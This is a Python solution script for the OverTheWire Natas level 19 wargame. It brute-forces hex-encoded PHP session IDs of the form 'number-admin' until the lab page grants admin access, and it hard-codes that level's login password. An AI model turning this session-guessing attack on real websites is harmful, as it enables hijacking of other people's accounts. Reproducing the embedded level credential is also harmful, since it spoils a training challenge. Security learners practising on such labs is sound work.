import requests
from requests.auth import HTTPBasicAuth

auth = HTTPBasicAuth("natas19", "tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr")
url = "http://natas19.natas.labs.overthewire.org/"

for i in range(0, 641):
    raw = f"{i}-admin"
    phpsessid = raw.encode().hex()
    cookies = {"PHPSESSID": phpsessid}
    r = requests.get(url, auth=auth, cookies=cookies)
    if "You are an admin" in r.text:
        print("SESSION RAW:", raw)
        print("SESSION HEX:", phpsessid)
        print(r.text)
        break
